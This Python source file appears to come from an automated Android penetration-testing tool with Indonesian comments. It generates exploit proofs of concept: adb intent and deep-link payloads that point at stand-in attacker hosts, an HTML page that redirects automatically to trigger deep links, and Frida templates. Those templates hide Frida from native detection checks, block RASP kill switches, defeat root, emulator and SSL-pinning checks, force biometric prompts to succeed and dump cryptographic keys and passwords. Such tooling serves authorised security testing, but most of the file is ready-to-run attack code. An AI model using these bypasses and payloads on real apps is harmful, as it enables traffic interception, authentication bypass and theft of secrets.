import os
import re
import json
import urllib.parse
from pathlib import Path
from typing import Dict, Any, List, Optional

class PoCEngine:
    """
    Engine untuk men-generate PoC & Exploit Scripts otomatis:
    - Opsi A: Ekstraksi parameter Intent (getStringExtra, getIntExtra, dll) & DeepLink Query Params
    - Opsi B: Generator Frida Bypass Script (Root, SSL Pinning, Biometric, Crypto Dumper)
    - Opsi C: HTML Exploit Builder (WebView XSS, DeepLink Launcher, Intent URL)
    - Opsi D: Python Auto-Verifier + Logcat Assertion
    - Opsi E: Skeleton AI Assistant Connector
    """

    def __init__(self, corpus_dir: Optional[Path] = None):
        self.corpus_dir = corpus_dir

    def extract_intent_extras_from_file(self, file_path: Path) -> List[Dict[str, Any]]:
        """Mengekstrak ekstra intent (String, Int, Boolean, Uri query) dari file Java atau Smali."""
        if not file_path.exists() or not file_path.is_file():
            return []
        
        try:
            content = file_path.read_text(encoding="utf-8", errors="ignore")
        except Exception:
            return []

        extras = []
        seen = set()

        # 1. String Extras: getStringExtra("key")
        for m in re.finditer(r'(?:getStringExtra|getString)\s*\(\s*["\']([^"\']+)["\']\s*\)', content):
            key = m.group(1).strip()
            if key and key not in seen:
                seen.add(key)
                extras.append({
                    "type": "string",
                    "key": key,
                    "sample_value": "https://evil.com/xss_payload",
                    "adb_flag": f'--es "{key}" "https://evil.com/xss_payload"'
                })

        # 2. Boolean Extras: getBooleanExtra("key", ...)
        for m in re.finditer(r'getBooleanExtra\s*\(\s*["\']([^"\']+)["\']\s*,\s*[^)]+\)', content):
            key = m.group(1).strip()
            if key and key not in seen:
                seen.add(key)
                extras.append({
                    "type": "boolean",
                    "key": key,
                    "sample_value": "true",
                    "adb_flag": f'--ez "{key}" true'
                })

        # 3. Integer / Long Extras: getIntExtra("key", ...) / getLongExtra("key", ...)
        for m in re.finditer(r'(?:getIntExtra|getLongExtra)\s*\(\s*["\']([^"\']+)["\']\s*,\s*[^)]+\)', content):
            key = m.group(1).strip()
            if key and key not in seen:
                seen.add(key)
                extras.append({
                    "type": "int",
                    "key": key,
                    "sample_value": "1337",
                    "adb_flag": f'--ei "{key}" 1337'
                })

        # 4. URI Query Parameters: getQueryParameter("param")
        for m in re.finditer(r'getQueryParameter\s*\(\s*["\']([^"\']+)["\']\s*\)', content):
            key = m.group(1).strip()
            if key and key not in seen:
                seen.add(key)
                extras.append({
                    "type": "query_param",
                    "key": key,
                    "sample_value": "https://attacker.com/callback",
                    "uri_part": f'{key}=https://attacker.com/callback'
                })

        # 5. Smali Patterns: const-string vX, "key" -> invoke-virtual {vY, vX}, Landroid/content/Intent;->getStringExtra
        for m in re.finditer(r'const-string\s+[vp]\d+,\s*["\']([^"\']+)["\']\s*\n\s*invoke-virtual\s*\{[^}]+\},\s*Landroid/content/Intent;->get(?:String|Boolean|Int)Extra', content):
            key = m.group(1).strip()
            if key and key not in seen:
                seen.add(key)
                extras.append({
                    "type": "string",
                    "key": key,
                    "sample_value": "EXPLOIT_PARAM",
                    "adb_flag": f'--es "{key}" "EXPLOIT_PARAM"'
                })

        return extras

    def find_component_source_files(self, component_name: str) -> List[Path]:
        """Mencari file .java atau .smali yang sesuai dengan nama class komponen."""
        if not self.corpus_dir or not self.corpus_dir.exists():
            return []

        rel_path_part = component_name.replace(".", "/")
        simple_name = component_name.split(".")[-1]
        matches = []

        for p in self.corpus_dir.rglob("*.java"):
            if rel_path_part in str(p).replace("\\", "/") or simple_name in p.name:
                matches.append(p)

        if not matches:
            for p in self.corpus_dir.rglob("*.smali"):
                if rel_path_part in str(p).replace("\\", "/") or simple_name in p.name:
                    matches.append(p)

        return matches[:3]

    def generate_component_poc(self, package_name: str, component: Dict[str, Any]) -> Dict[str, Any]:
        """Menghasilkan PoC terinci untuk komponen yang diekspor dengan ekstraksi parameter asli."""
        comp_name = component.get("name", "")
        comp_type = (component.get("type") or "activity").lower()
        exported = component.get("exported") in (True, "true", "True")
        authority = component.get("authority", "")

        # Ekstraksi parameter asli dari kode jika corpus tersedia
        extracted_extras = []
        if comp_name:
            source_files = self.find_component_source_files(comp_name)
            for sf in source_files:
                extras = self.extract_intent_extras_from_file(sf)
                if extras:
                    extracted_extras.extend(extras)
                    break

        # Susun ADB flags dari extracted parameters
        extra_flags = " ".join([e["adb_flag"] for e in extracted_extras if "adb_flag" in e])
        if not extra_flags:
            # Fallback jika tidak terdeteksi extras khusus
            if comp_type == "activity":
                extra_flags = '--es "url" "https://evil.com" --ez "is_admin" true'
            else:
                extra_flags = '--es "data" "probe_payload"'

        full_target = f"{package_name}/{comp_name}" if not comp_name.startswith(package_name) else comp_name
        if "/" not in full_target:
            full_target = f"{package_name}/{comp_name}"

        # 1. Shell Script PoC
        if comp_type == "activity":
            adb_cmd = f'adb shell am start -n {full_target} {extra_flags}'.strip()
            desc = "Launch Unprotected Exported Activity with Extracted Intent Extras"
        elif comp_type == "service":
            adb_cmd = f'adb shell am startservice -n {full_target} {extra_flags}'.strip()
            desc = "Trigger Exported Background Service directly"
        elif comp_type == "receiver":
            adb_cmd = f'adb shell am broadcast -n {full_target} {extra_flags}'.strip()
            desc = "Send Spoofed Broadcast to Exported Receiver"
        elif comp_type == "provider":
            auth_val = authority or f"{package_name}.provider"
            adb_cmd = f'adb shell content query --uri content://{auth_val}/'
            desc = "Query Exported Content Provider directly"
        else:
            adb_cmd = f'adb shell am start -n {full_target} {extra_flags}'.strip()
            desc = "Direct Component Invocation"

        bash_script = f"""#!/bin/bash
# ==============================================================================
# Exploit PoC for Exported {comp_type.upper()}: {comp_name.split('.')[-1]}
# Target Package: {package_name}
# Description: {desc}
# ==============================================================================

echo "[*] Sending payload to target component..."
{adb_cmd}

echo "[+] Done. Check device screen or logcat."
"""

        # 2. Python Auto-Verifier PoC dengan Logcat Watcher (Opsi D)
        python_script = f"""#!/usr/bin/env python3
# ==============================================================================
# Automated Verification Script with Logcat Assertion
# Target: {package_name} ({comp_name})
# ==============================================================================
import subprocess
import time
import sys

PACKAGE = "{package_name}"
COMPONENT = "{full_target}"

print(f"[*] Starting logcat listener for {{PACKAGE}}...")
# Clear logcat first
subprocess.run(["adb", "logcat", "-c"], check=False)

print(f"[*] Executing exploit command...")
cmd = {json.dumps(adb_cmd.split())}
proc = subprocess.run(cmd, capture_output=True, text=True)
print(f"[>] Command output: {{proc.stdout.strip()}}")

time.sleep(1.5)

print(f"[*] Checking logcat for exceptions or successful trigger...")
log_proc = subprocess.run(["adb", "logcat", "-d", "-s", "AndroidRuntime:E", f"{{PACKAGE}}:V"], capture_output=True, text=True)
logs = log_proc.stdout

if "FATAL EXCEPTION" in logs or "Crash" in logs:
    print("[!] ALERT: Application crashed / NullPointer triggered via intent manipulation!")
elif proc.returncode == 0:
    print("[+] SUCCESS: Intent delivered successfully without permission denial.")
else:
    print(f"[-] Execution failed: {{proc.stderr}}")
"""

        return {
            "component_name": comp_name,
            "component_type": comp_type,
            "exported": exported,
            "extracted_extras": extracted_extras,
            "adb_command": adb_cmd,
            "bash_poc": bash_script,
            "python_poc": python_script
        }

    def generate_deeplink_poc(self, package_name: str, deeplink_str: str) -> Dict[str, Any]:
        """Menghasilkan PoC lengkap untuk skema Deep Link & WebView Launcher (Opsi C & D)."""
        scheme_url = deeplink_str.strip()
        if "://" not in scheme_url:
            scheme_url = f"{scheme_url}://open?url=https://attacker.com/xss"

        # Coba parse query string atau tambahkan parameter redirect uji coba
        parsed = urllib.parse.urlparse(scheme_url)
        params = urllib.parse.parse_qs(parsed.query)
        
        test_url = scheme_url
        if not parsed.query:
            test_url = f"{scheme_url}?url=https://attacker.com/poc_redirect&target=https://attacker.com/evil"

        adb_cmd = f'adb shell am start -a android.intent.action.VIEW -d "{test_url}"'

        bash_script = f"""#!/bin/bash
# ==============================================================================
# Exploit PoC for DeepLink Intent Scheme: {deeplink_str}
# Target Package: {package_name}
# ==============================================================================

echo "[*] Triggering DeepLink intent onView..."
{adb_cmd}
"""

        # HTML Exploit Launcher (Opsi C)
        html_exploit = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>DeepLink & WebView Hijacking PoC - {package_name}</title>
    <style>
        body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0f172a; color: #e2e8f0; padding: 40px; }}
        .card {{ background: #1e293b; border: 1px solid #334155; border-radius: 12px; padding: 24px; max-width: 700px; margin: 0 auto; }}
        h1 {{ color: #38bdf8; font-size: 20px; }}
        a.button {{ display: inline-block; background: #3b82f6; color: white; padding: 12px 24px; border-radius: 8px; text-decoration: none; font-weight: bold; margin-top: 16px; }}
        code {{ background: #0f172a; padding: 4px 8px; border-radius: 4px; color: #a3e635; font-family: monospace; }}
    </style>
</head>
<body>
    <div class="card">
        <h1>🎯 DeepLink Redirection / XSS Exploit PoC</h1>
        <p>Target App: <code>{package_name}</code></p>
        <p>Target DeepLink URL Scheme:</p>
        <p><code>{test_url}</code></p>
        <hr style="border-color:#334155; margin: 20px 0;">
        <p>Klik tombol di bawah jika aplikasi tidak terbuka secara otomatis:</p>
        <a href="{test_url}" class="button">🚀 Trigger DeepLink Exploit</a>
    </div>

    <!-- Automatic Redirection Trigger -->
    <script>
        setTimeout(function() {{
            window.location.href = "{test_url}";
        }}, 800);
    </script>
</body>
</html>
"""

        # Python Assertion PoC
        python_poc = f"""#!/usr/bin/env python3
import subprocess
import time

DEEPLINK = "{test_url}"
print(f"[*] Triggering DeepLink: {{DEEPLINK}}")
subprocess.run(["adb", "shell", "am", "start", "-a", "android.intent.action.VIEW", "-d", DEEPLINK])
"""

        return {
            "deeplink": deeplink_str,
            "test_url": test_url,
            "adb_command": adb_cmd,
            "bash_poc": bash_script,
            "html_poc": html_exploit,
            "python_poc": python_poc
        }

    # ------------------------------------------------------------------
    # RASP-AWARE FRIDA BYPASS GENERATOR
    # Baca hasil deteksi RASP (meta["rasp"] dari findings.json) lalu rakit
    # script sesuai musuh: anti-frida-detection native, hook per-RASP SDK,
    # bypass standar (SSL pinning / root / biometric / crypto).
    # ------------------------------------------------------------------

    @staticmethod
    def _analyze_rasp_profile(rasp_info: str, frameworks, findings) -> dict:
        rl = (rasp_info or "").lower()
        # label scanner diawali "TERDETEKSI" / "SEBAGIAN" / "TIDAK TERDETEKSI"
        # — pakai startswith agar "tidak terdeteksi" tidak dianggap proteksi
        protected = rl.startswith("terdeteksi") or rl.startswith("sebagian")
        fw = [str(f).lower() for f in (frameworks or [])]
        cats = [str((f or {}).get("category") or "").lower() for f in (findings or [])]
        # protektor komersial/packer: dari label kategori ATAU nama SDK yang dikenal
        commercial_marks = [
            "appsealing", "promon", "dexguard", "appguard", "bangcle", "secneo",
            "jiagu", "legu", "v-guard", "vguard", "appdome", "whitecryption",
            "free_rasp", "integrity", "baidu protect", "alibaba security",
        ]
        return {
            "rasp_label": rasp_info or "TIDAK TERDETEKSI (tidak ada indikasi runtime protection)",
            "commercial": (rl.startswith("terdeteksi") and (("komersial" in rl) or ("packer" in rl)))
                           or any(m in rl for m in commercial_marks),
            "rootbeer": "rootbeer" in rl,
            "anti_debug": "anti-debug" in rl,
            "anti_vm": "anti-vm" in rl,
            # ada proteksi apa pun (komersial/packer/lib/in-app) -> sembunyikan frida
            "anti_frida": protected,
            "flutter": "flutter" in fw,
            "crypto": any("crypto" in c or "key" in c or "credentials" in c for c in cats),
        }

    def generate_frida_bypass_script(self, package_name: str,
                                     findings: List[Dict[str, Any]] = None,
                                     rasp_info: str = "",
                                     frameworks: List[str] = None) -> str:
        """Generate RASP-aware Frida bypass script dari hasil scan.

        Urutan blok disesuaikan proteksi yang terdeteksi:
        [0] anti-frida-detection (native libc)  -> jalan duluan (blinding)
        [1] exit-guard utk RASP kill-switch      -> RASP komersial/packer
        [2] hook per-RASP SDK (RootBeer, dst.)
        [3] anti-debug / anti-VM
        [4] bypass standar: SSL pinning, root, biometric
        [5] crypto dumper (jika temuan crypto/kredensial)
        """
        findings = findings or []
        prof = self._analyze_rasp_profile(rasp_info, frameworks, findings)

        blocks_native = []
        if prof["anti_frida"]:
            blocks_native.append(_JS_ANTI_FRIDA_NATIVE)
        if prof["anti_debug"]:
            blocks_native.append(_JS_ANTI_DEBUG_NATIVE)

        blocks_java = []
        if prof["commercial"]:
            blocks_java.append(_JS_RASP_EXIT_GUARD)
        if prof["rootbeer"]:
            blocks_java.append(_JS_ROOTBEER)
        if prof["anti_vm"]:
            blocks_java.append(_JS_ANTI_VM)
        blocks_java.append(_JS_SSL_PINNING)
        blocks_java.append(_JS_ROOT)
        blocks_java.append(_JS_BIOMETRIC)
        if prof["crypto"]:
            blocks_java.append(_JS_CRYPTO)
        if prof["flutter"]:
            blocks_java.append(_JS_FLUTTER)

        detected = [k for k, v in prof.items() if v and k != "rasp_label"]
        header_features = []
        if prof["anti_frida"]:
            header_features.append("[0] Anti-Frida-Detection (native libc: strstr/fgets/connect/access)")
        if prof["anti_debug"]:
            header_features.append("[0b] Anti-Debug bypass (ptrace + isDebuggerConnected)")
        if prof["commercial"]:
            header_features.append("[1] RASP Kill-Switch Guard (System.exit/killProcess diblokir)")
        if prof["rootbeer"]:
            header_features.append("[2] RootBeer spesifik (semua checker -> false)")
        if prof["anti_vm"]:
            header_features.append("[3] Anti-VM bypass (qemu/goldfish/ranchu)")
        header_features.append("[4] Universal SSL Pinning Bypass (SSLContext/OkHttp/Conscrypt/WebView)")
        header_features.append("[4b] Root detection bypass (path luas + Runtime.exec)")
        header_features.append("[4c] BiometricPrompt auto-pass")
        if prof["crypto"]:
            header_features.append("[5] Crypto dumper (key + IV + plaintext/ciphertext)")
        if prof["flutter"]:
            header_features.append("[6] Flutter note: Dart logic TIDAK tersentuh Java hook")

        script = _JS_HEADER_TEMPLATE \
            .replace("__PKG__", package_name) \
            .replace("__RASP__", prof["rasp_label"]) \
            .replace("__FEATURES__", "\n *   ".join(header_features)) \
            .replace("__DETECTED__", ", ".join(detected) or "tidak ada proteksi terdeteksi")

        native_section = "\n".join(blocks_native) if blocks_native else ""
        java_section = "\n".join(blocks_java)

        script = script.replace("__NATIVE_BLOCKS__", native_section)
        script = script.replace("__JAVA_BLOCKS__", java_section)
        script = script.replace("__PKG2__", package_name)
        return script



# ======================================================================
# JS BLOCK TEMPLATES (RASP-aware Frida bypass generator)
# Catatan: string JS polos (bukan f-string) — brace aman.
# ======================================================================

_JS_HEADER_TEMPLATE = """/**
 * ==============================================================================
 * RASP-AWARE Frida Bypass Suite — MOPETOT (Mobile Penetration Testing Otomation)
 * Target Package : __PKG__
 * RASP Detected  : __RASP__
 * Profile flags  : __DETECTED__
 * Fitur aktif:
 *   __FEATURES__
 *
 * PENTING - urutan jalan:
 *   blok [0] native aktif duluan (menyembunyikan jejak frida dari RASP),
 *   baru blok Java (bypass fungsional). Semua blok ada log — hook yang
 *   gagal TIDAK diam-diam.
 *
 * Cara pakai (spawn, paling awet untuk RASP):
 *   frida -U -f __PKG__ -l bypass_hooks.js
 * Rekomendasi tambahan untuk RASP komersial:
 *   - rename frida-server (contoh: /data/local/tmp/mysv) + port non-default
 *     (frida-server -l 127.0.0.1:8888)
 *   - magisk denylist / magiskhide utk hide root
 * ==============================================================================
 */
(function () {
__NATIVE_BLOCKS__

    Java.perform(function () {
        function tryBlock(name, fn) {
            try {
                fn();
                console.log("[+] [" + name + "] aktif.");
            } catch (e) {
                console.log("[-] [" + name + "] GAGAL: " + e);
            }
        }

__JAVA_BLOCKS__
        console.log("[*] [Frida] RASP-aware bypass siap untuk __PKG2__.");
    });
})();
"""

_JS_ANTI_FRIDA_NATIVE = """    // ==========================================================================
    // [0] ANTI-FRIDA-DETECTION (NATIVE) — palsuin hasil libc check RASP
    // ==========================================================================
    try {
        var FRIDA_MARKS = ["frida", "gum-js", "gmain", "gdbus", "linjector",
                           "re.frida", "frida-agent", "frida-server", "frida-helper"];
        function hasFridaMark(s) {
            if (!s) return false;
            s = s.toLowerCase();
            for (var i = 0; i < FRIDA_MARKS.length; i++) {
                if (s.indexOf(FRIDA_MARKS[i]) > -1) return true;
            }
            return false;
        }

        // strstr("...", "frida") -> NULL
        var p_strstr = Module.findExportByName(null, "strstr");
        if (p_strstr) {
            Interceptor.attach(p_strstr, {
                onEnter: function (args) { this.needle = Memory.readCString(args[1]); },
                onLeave: function (retval) {
                    if (hasFridaMark(this.needle)) retval.replace(ptr(0));
                }
            });
        }
        var p_strcasestr = Module.findExportByName(null, "strcasestr");
        if (p_strcasestr) {
            Interceptor.attach(p_strcasestr, {
                onEnter: function (args) { this.needle = Memory.readCString(args[1]); },
                onLeave: function (retval) {
                    if (hasFridaMark(this.needle)) retval.replace(ptr(0));
                }
            });
        }
        // fgets: scrub baris yang menyebut frida (dipakai baca /proc/self/maps)
        var p_fgets = Module.findExportByName(null, "fgets");
        if (p_fgets) {
            Interceptor.attach(p_fgets, {
                onLeave: function (retval) {
                    if (!retval.isNull()) {
                        try {
                            var line = Memory.readCString(retval);
                            if (hasFridaMark(line)) {
                                Memory.writeUtf8String(retval, "# scrubbed");
                            }
                        } catch (e) {}
                    }
                }
            });
        }
        // connect() ke port frida (27042/27043) -> gagal
        var p_connect = Module.findExportByName(null, "connect");
        if (p_connect) {
            Interceptor.attach(p_connect, {
                onEnter: function (args) {
                    this.block = false;
                    try {
                        var sa = args[1];
                        var family = Memory.readU16(sa);
                        if (family === 2) {
                            var port = (Memory.readU8(sa.add(2)) << 8) | Memory.readU8(sa.add(3));
                            if (port === 27042 || port === 27043) this.block = true;
                        }
                    } catch (e) {}
                },
                onLeave: function (retval) {
                    if (this.block) retval.replace(-1);
                }
            });
        }
        // access()/stat() ke path frida-server -> ENOENT
        var p_access = Module.findExportByName(null, "access");
        if (p_access) {
            Interceptor.attach(p_access, {
                onEnter: function (args) {
                    try { this.path = Memory.readCString(args[0]); } catch (e) { this.path = null; }
                    this.block = hasFridaMark(this.path);
                },
                onLeave: function (retval) {
                    if (this.block) retval.replace(-1);
                }
            });
        }
        console.log("[+] [AntiFrida] native libc hooks aktif (strstr/fgets/connect/access).");
    } catch (e) {
        console.log("[-] [AntiFrida] " + e);
    }
"""

_JS_ANTI_DEBUG_NATIVE = """    // ==========================================================================
    // [0b] ANTI-DEBUG (NATIVE) — ptrace self-check -> sukses palsu
    // ==========================================================================
    try {
        var p_ptrace = Module.findExportByName(null, "ptrace");
        if (p_ptrace) {
            Interceptor.attach(p_ptrace, {
                onLeave: function (retval) { retval.replace(0); }
            });
            console.log("[+] [AntiDebug] ptrace hook aktif.");
        }
    } catch (e) {
        console.log("[-] [AntiDebug] " + e);
    }
"""

_JS_RASP_EXIT_GUARD = """        // ======================================================================
        // [1] RASP KILL-SWITCH GUARD — protektor komersial sering bunuh diri
        //     (exit/killProcess) saat deteksi. Kita blokir + log siapa yang manggil.
        // ======================================================================
        tryBlock("RASP-ExitGuard", function () {
            var JSystem = Java.use("java.lang.System");
            JSystem.exit.overload("int").implementation = function (code) {
                console.log("[!] [RASP-ExitGuard] System.exit(" + code + ") DIBLOKIR — kemungkinan kill-switch RASP.");
                return;
            };
            var JRuntime = Java.use("java.lang.Runtime");
            JRuntime.exit.overload("int").implementation = function (code) {
                console.log("[!] [RASP-ExitGuard] Runtime.exit(" + code + ") DIBLOKIR.");
                return;
            };
            var JProcess = Java.use("android.os.Process");
            JProcess.killProcess.overload("int").implementation = function (pid) {
                console.log("[!] [RASP-ExitGuard] killProcess(" + pid + ") DIBLOKIR.");
                return;
            };
        });
"""

_JS_ROOTBEER = """        // ======================================================================
        // [2] ROOTBEER SPESIFIK — scanner mendeteksi library ini di corpus
        // ======================================================================
        tryBlock("RootBeer", function () {
            var RootBeer = Java.use("com.scottyab.rootbeer.RootBeer");
            var checkers = ["isRooted", "isAccessGiven", "isSuBinaryPresent", "isBusyboxBinaryPresent",
                            "isSelinuxFlagInEnabled", "detectRootManagementApps",
                            "detectPotentiallyDangerousApps", "detectTestKeys",
                            "checkForBinary", "checkForBusyBoxBinary", "checkForMagiskBinary",
                            "checkForDangerousProperties", "checkForRootNative",
                            "isInstalledFromGooglePlay", "isRunningOnEmulator"];
            checkers.forEach(function (m) {
                try {
                    RootBeer[m].overloads.forEach(function (ov) {
                        ov.implementation = function () {
                            console.log("[+] [RootBeer] " + m + "() -> false");
                            return false;
                        };
                    });
                } catch (e) {
                    console.log("[-] [RootBeer] " + m + ": " + e);
                }
            });
        });
"""

_JS_ANTI_VM = """        // ======================================================================
        // [3] ANTI-VM BYPASS — scanner mendeteksi in-app anti-VM check
        // ======================================================================
        tryBlock("AntiVM", function () {
            var SysProps = Java.use("android.os.SystemProperties");
            SysProps.get.overload("java.lang.String").implementation = function (key) {
                if (key === "ro.kernel.qemu" || key === "ro.kernel.qemu.gles") return "0";
                if (key === "ro.hardware") return "qcom";
                if (key === "ro.product.device" || key === "ro.product.board") return "walleye";
                if (key === "ro.build.tags") return "release-keys";
                return this.get.call(this, key);
            };
            var Build = Java.use("android.os.Build");
            var FINGERPRINT = "google/walleye/walleye:8.1.0/OPM1.171019.011:user/release-keys";
            try { Build.FINGERPRINT.value = FINGERPRINT; } catch (e) {}
            try { Build.HARDWARE.value = "qcom"; } catch (e) {}
            try { Build.MODEL.value = "Pixel 2"; } catch (e) {}
            try { Build.TAGS.value = "release-keys"; } catch (e) {}
        });
"""

_JS_SSL_PINNING = """        // ======================================================================
        // [4] UNIVERSAL SSL PINNING BYPASS
        // ======================================================================
        tryBlock("SSL-SSLContext", function () {
            var X509TrustManager = Java.use("javax.net.ssl.X509TrustManager");
            var SSLContext = Java.use("javax.net.ssl.SSLContext");
            var TrustManager = Java.registerClass({
                name: "com.mopetot.TrustAllManager",
                implements: [X509TrustManager],
                methods: {
                    checkClientTrusted: function (chain, authType) {},
                    checkServerTrusted: function (chain, authType) {},
                    getAcceptedIssuers: function () { return []; }
                }
            });
            var TrustManagers = [TrustManager.$new()];
            var SSLContext_init = SSLContext.init.overload(
                "[Ljavax.net.ssl.KeyManager;", "[Ljavax.net.ssl.TrustManager;", "Ljava.security.SecureRandom;"
            );
            SSLContext_init.implementation = function (keyManager, trustManager, secureRandom) {
                console.log("[+] [SSL] SSLContext.init() -> TrustAllManager");
                SSLContext_init.call(this, keyManager, TrustManagers, secureRandom);
            };
        });

        tryBlock("SSL-Conscrypt", function () {
            // vector pinning paling umum Android modern (OkHttp via TrustManagerFactory)
            var TrustManagerImpl = Java.use("com.android.org.conscrypt.TrustManagerImpl");
            TrustManagerImpl.checkServerTrusted.overload(
                "[Ljava.security.cert.X509Certificate;", "java.lang.String", "java.net.Socket"
            ).implementation = function (chain, authType, socket) {
                console.log("[+] [SSL] TrustManagerImpl.checkServerTrusted(Socket) bypassed");
                return;
            };
            TrustManagerImpl.checkServerTrusted.overload(
                "[Ljava.security.cert.X509Certificate;", "java.lang.String", "javax.net.ssl.SSLEngine"
            ).implementation = function (chain, authType, engine) {
                console.log("[+] [SSL] TrustManagerImpl.checkServerTrusted(SSLEngine) bypassed");
                return;
            };
        });

        tryBlock("SSL-OkHttp", function () {
            var CertificatePinner = Java.use("okhttp3.CertificatePinner");
            CertificatePinner.check.overload("java.lang.String", "java.util.List").implementation = function (hostname, peerCertificates) {
                console.log("[+] [SSL] OkHttp3 CertificatePinner.check(List) bypassed: " + hostname);
                return;
            };
            CertificatePinner.check.overload("java.lang.String", "[Ljava.security.cert.Certificate;").implementation = function (hostname, peerCertificates) {
                console.log("[+] [SSL] OkHttp3 CertificatePinner.check(Array) bypassed: " + hostname);
                return;
            };
        });

        tryBlock("SSL-OkHttp4-Internal", function () {
            // OkHttp 4.x internal method check$okhttp — di-guard biar versi lain gak error
            var CP = Java.use("okhttp3.CertificatePinner");
            ["check$okhttp", "check$okhttp$android"].forEach(function (m) {
                try {
                    CP[m].overloads.forEach(function (ov) {
                        ov.implementation = function () {
                            console.log("[+] [SSL] CertificatePinner." + m + "() bypassed");
                            return;
                        };
                    });
                } catch (e) {}
            });
        });

        tryBlock("SSL-WebView", function () {
            var WebViewClient = Java.use("android.webkit.WebViewClient");
            WebViewClient.onReceivedSslError.implementation = function (view, handler, error) {
                console.log("[+] [SSL] WebViewClient.onReceivedSslError() -> proceed");
                handler.proceed();
            };
        });
"""

_JS_ROOT = """        // ======================================================================
        // [4b] ROOT DETECTION BYPASS — path luas + Runtime.exec filtering
        // ======================================================================
        tryBlock("Root", function () {
            var SU_PATHS = ["/system/bin/su", "/system/xbin/su", "/sbin/su", "/su/bin/su",
                            "/system/sd/xbin/su", "/data/local/su", "/data/local/xbin/su",
                            "/data/local/bin/su", "/data/local/tmp/su", "/system/bin/failsafe/su",
                            "/system/app/Superuser.apk", "/system/app/SuperSU",
                            "/system/bin/magisk", "/sbin/magisk", "/data/adb/magisk",
                            "/data/adb/magisk.db", "/data/local/tmp/magisk",
                            "/vendor/bin/su", "/system/bin/.ext/su", "/sbin/.magisk"];
            var File = Java.use("java.io.File");
            File.exists.implementation = function () {
                var path = this.getAbsolutePath();
                for (var i = 0; i < SU_PATHS.length; i++) {
                    if (path.indexOf(SU_PATHS[i]) > -1) {
                        console.log("[+] [Root] hide path: " + path);
                        return false;
                    }
                }
                if (path.indexOf("qemu_pipe") > -1 || path.indexOf("goldfish") > -1 ||
                    path.indexOf("vbox") > -1 || path.indexOf("genymotion") > -1) {
                    console.log("[+] [AntiVM] hide path: " + path);
                    return false;
                }
                return this.exists.call(this);
            };
            var Runtime_ = Java.use("java.lang.Runtime");
            Runtime_.exec.overload("java.lang.String").implementation = function (cmd) {
                if (cmd && (cmd.indexOf("which su") > -1 || cmd.indexOf("which busybox") > -1)) {
                    console.log("[+] [Root] Runtime.exec('" + cmd + "') -> diganti 'true'");
                    return this.exec.call(this, "true");
                }
                return this.exec.call(this, cmd);
            };
            var SysProps = Java.use("android.os.SystemProperties");
            SysProps.get.overload("java.lang.String").implementation = function (key) {
                if (key === "ro.build.tags" || key === "ro.debuggable") return "release-keys";
                if (key === "ro.secure") return "1";
                return this.get.call(this, key);
            };
        });
"""

_JS_BIOMETRIC = """        // ======================================================================
        // [4c] BIOMETRIC AUTO-PASS — semua overload + legacy FingerprintManager
        // ======================================================================
        tryBlock("Biometric", function () {
            var BP = Java.use("androidx.biometric.BiometricPrompt");
            BP.authenticate.overloads.forEach(function (ov) {
                ov.implementation = function () {
                    console.log("[+] [Biometric] authenticate() -> auto-success");
                    try {
                        var cb = this.mAuthenticationCallback.value;
                        if (cb && cb.onAuthenticationSucceeded) {
                            cb.onAuthenticationSucceeded(null);
                        }
                    } catch (e) {
                        console.log("[-] [Biometric] callback field rename? " + e);
                    }
                    return;
                };
            });
        });
        tryBlock("Biometric-Legacy", function () {
            var FM = Java.use("android.hardware.fingerprint.FingerprintManager");
            FM.authenticate.overloads.forEach(function (ov) {
                ov.implementation = function () {
                    console.log("[+] [Biometric] FingerprintManager.authenticate() -> auto-success");
                    return;
                };
            });
        });
"""

_JS_CRYPTO = """        // ======================================================================
        // [5] CRYPTO DUMPER — key + IV + plaintext/ciphertext terkorelasi
        // ======================================================================
        tryBlock("Crypto", function () {
            function toHex(bytes) {
                if (!bytes) return "null";
                var hex = "";
                for (var i = 0; i < bytes.length; i++) {
                    var b = (bytes[i] & 0xFF).toString(16);
                    if (b.length === 1) b = "0" + b;
                    hex += b;
                }
                return hex;
            }
            var SecretKeySpec = Java.use("javax.crypto.spec.SecretKeySpec");
            SecretKeySpec.$init.overload("[B", "java.lang.String").implementation = function (keyBytes, algorithm) {
                console.log("[KEY] SecretKeySpec(" + algorithm + "): " + toHex(keyBytes));
                return this.$init(keyBytes, algorithm);
            };
            var IvParameterSpec = Java.use("javax.crypto.spec.IvParameterSpec");
            IvParameterSpec.$init.overload("[B").implementation = function (iv) {
                console.log("[IV] IvParameterSpec: " + toHex(iv));
                return this.$init(iv);
            };
            var PBEKeySpec = Java.use("javax.crypto.spec.PBEKeySpec");
            PBEKeySpec.$init.overload("[C").implementation = function (password) {
                var pw = "";
                for (var i = 0; i < password.length; i++) pw += String.fromCharCode(password[i]);
                console.log("[KEY] PBE password: " + pw);
                return this.$init(password);
            };
            var Cipher = Java.use("javax.crypto.Cipher");
            Cipher.doFinal.overloads.forEach(function (ov) {
                ov.implementation = function () {
                    var res = ov.apply(this, arguments);
                    var algo = "?";
                    try { algo = this.getAlgorithm(); } catch (e) {}
                    var iv = "n/a";
                    try { iv = toHex(this.getIV()); } catch (e) {}
                    console.log("[CIPHER] " + algo + " | IV=" + iv + " | inLen=" + (arguments.length ? (arguments[0] && arguments[0].length ? arguments[0].length : "?") : "?") + " | outLen=" + (res && res.length ? res.length : "?"));
                    return res;
                };
            });
        });
"""

_JS_FLUTTER = """        // ======================================================================
        // [6] CATATAN FLUTTER — target ini app Flutter (libapp.so terdeteksi)
        //     Java hook TIDAK menyentuh logic Dart. Untuk traffic/bypass Dart:
        //     1) reFlutter (rebuild engine): pip install reflutter
        //     2) Hook BoringSSL di libflutter.so jika symbol tersedia:
        // ======================================================================
        tryBlock("Flutter-Native", function () {
            ["ssl_verify_cert_chain", "ssl_verify_server_cert", "SSL_get_verify_result"].forEach(function (sym) {
                try {
                    var addr = Module.findExportByName("libflutter.so", sym);
                    if (addr) {
                        Interceptor.attach(addr, {
                            onLeave: function (retval) {
                                retval.replace(0);
                                console.log("[+] [Flutter] " + sym + "() -> 0 (cert diterima)");
                            }
                        });
                    }
                } catch (e) {}
            });
        });
"""

